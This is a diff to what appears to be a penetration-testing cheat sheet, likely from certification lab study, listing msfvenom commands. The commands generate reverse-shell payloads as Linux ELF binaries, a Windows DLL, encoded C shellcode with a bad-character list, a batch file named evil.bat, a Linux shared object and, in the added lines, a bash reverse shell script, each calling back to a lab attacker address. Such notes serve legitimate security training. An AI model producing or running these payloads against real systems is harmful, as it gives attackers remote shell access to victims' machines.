@@ -10,7 +10,7 @@ msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=192.168.45.178 LPORT=443 -o
 # Keep in mind that you can encode the payloads
 
 # For a DLL
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.231 LPORT=88 -f dll -o beyondhelper.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.231 LPORT=88 -f dll > beyondhelper.dll
 
 # In the fixing exploits module for a thread
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
@@ -47,3 +47,6 @@ msfvenom -p cmd/windows/reverse_powershell lhost= lport= > evil.bat
 
 # Shared Object - Linux (.so)
 msfvenom -p linux/x86/shell_reverse_tcp -f elf-so LHOST=192.168.45.178 LPORT=6379 -o utils.so
+
+# Bash Reverse Shell
+msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.221 LPORT=2222 -f raw > shell2222.sh
